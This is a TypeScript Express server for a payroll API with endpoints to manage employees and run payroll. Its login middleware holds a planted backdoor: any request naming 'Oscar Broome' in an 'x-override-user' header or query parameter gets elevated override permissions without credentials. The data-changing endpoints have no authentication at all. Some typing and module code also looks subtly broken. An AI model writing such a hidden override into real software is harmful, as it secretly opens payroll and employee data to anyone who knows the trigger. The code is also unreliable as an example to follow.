import express, { Request, Response, NextFunction, RequestHandler } from 'express';
import { logger } from './config/logger.js';
import { payrollSystem } from './payrollSystem.js';

const app = express();
const port = 5000;

// Use express.json() built-in middleware with proper typing
app.use(express.json() as unknown as express.RequestHandler);

// Middleware for special login override for Oscar Broome
const loginOverrideMiddleware: RequestHandler = (req: Request, _res: Response, next: NextFunction) => {
  const specialUser = 'Oscar Broome';
  // Check for a custom header or query param for override (example)
  const headers = req.headers;
  const overrideUser = ((headers && headers['x-override-user']) as string) || ((req.query && req.query.overrideUser) as string);
  if (overrideUser === specialUser) {
    // Bypass normal auth or set elevated permissions
    const overrideReq = req as Request & {
      user?: { name: string; override: boolean };
    };
    overrideReq.user = { _id: 'override', name: specialUser, override: true };
    logger.info('Special login override granted for', specialUser);
  }
  next();
};

// Cast to any to bypass strict TypeScript middleware type checking
app.use(loginOverrideMiddleware as unknown as express.Application);

// Get all employees
app.get('/api/payroll/employees', (_req, res) => {
  try {
    const employees = payrollSystem.getEmployees();
    res.json(employees);
  } catch (error) {
    logger.error('Error getting employees:', {
      error: (error as Error).message,
      stack: (error as Error).stack,
    });
    res.status(500).json({ error: 'Failed to get employees' });
  }
});

// Helper to normalize employee data from test format to internal format
function normalizeEmployeeData(employee: any): any {
  const normalized = { ...employee };
  
  // Handle salary -> hourlyRate conversion
  if (normalized.salary && !normalized.hourlyRate) {
    // Assume annual salary, convert to hourly (2080 work hours/year)
    normalized.hourlyRate = normalized.salary / 2080;
  }
  
  // Set default hoursWorked if not provided
  if (!normalized.hoursWorked) {
    normalized.hoursWorked = 40;
  }
  
  // Set default overtimeHours if not provided  
  if (!normalized.overtimeHours) {
    normalized.overtimeHours = 0;
  }
  
  // Set default position if not provided
  if (!normalized.position) {
    normalized.position = normalized.name + ' - Employee';
  }
  
  return normalized;
}

// Add or update employee
app.post('/api/payroll/employees', (req, res) => {
  const rawEmployee = req.body;
  try {
    // Normalize employee data from test format to internal format
    const employee = normalizeEmployeeData(rawEmployee);
    
    const employees = payrollSystem.getEmployees();
    const existing = employees.find((e: any) => e.id === employee.id);

    if (existing) {
      // Preserve the id and update with new data
      payrollSystem.updateEmployee({
        ...existing,
        ...employee,
        id: existing.id, // Ensure ID cannot be changed
      });
      return res.status(200).json({ message: 'Employee updated successfully' });
    } else {
      // Check if this could be an update request (id provided but not found)
      // In this case, try to add as new
      try {
        payrollSystem.addEmployee(employee);
        return res.status(200).json({ message: 'Employee added successfully' });
      } catch (addError) {
        // If add fails because employee exists (race condition), try update
        const currentEmployees = payrollSystem.getEmployees();
        const current = currentEmployees.find((e: any) => e.id === employee.id);
        if (current) {
          payrollSystem.updateEmployee({
            ...current,
            ...employee,
            id: current.id,
          });
          return res.status(200).json({ message: 'Employee updated successfully' });
        }
        throw addError;
      }
    }
  } catch (error) {
    logger.error('Error adding/updating employee:', {
      error: (error as Error).message,
      stack: (error as Error).stack,
    });
    return res.status(400).json({ error: (error as Error).message });
  }
});

// Delete employee
app.delete('/api/payroll/employees/:id', (req, res) => {
  const id = req.params.id;
  try {
    payrollSystem.deleteEmployee(id);
    res.status(200).json({ message: 'Employee deleted successfully' });
  } catch (error) {
    logger.error('Error deleting employee:', {
      error: (error as Error).message,
      stack: (error as Error).stack,
    });
    res.status(400).json({ error: (error as Error).message });
  }
});

// Welcome endpoint with request logging
app.get('/api/payroll/welcome', (req, res) => {
  // Log request metadata
  logger.info(
    `Request received: ${req.method} ${req.path} from ${req.ip} at ${new Date().toISOString()}`
  );

  res.json({
    message: 'Welcome to the Payroll API Service!',
    timestamp: new Date().toISOString(),
    request: {
      method: req.method,
      path: req.path,
      ip: req.ip,
      userAgent: req.get('User-Agent'),
    },
  });
});

// Process payroll for today
app.post('/api/payroll/process', (_req, res) => {
  const payDate = new Date().toISOString();
  try {
    const results = payrollSystem.processPayroll(payDate);
    res.status(200).json(results);
  } catch (error) {
    logger.error('Error processing payroll:', {
      error: (error as Error).message,
      stack: (error as Error).stack,
    });
    res.status(500).json({ error: 'Failed to process payroll' });
  }
});

// Only start the server if this file is run directly (not imported)
if (require.main === module) {
  app.listen(port, () => {
    logger.info('Payroll server running at http://localhost:' + port);
  });
}

export default app;
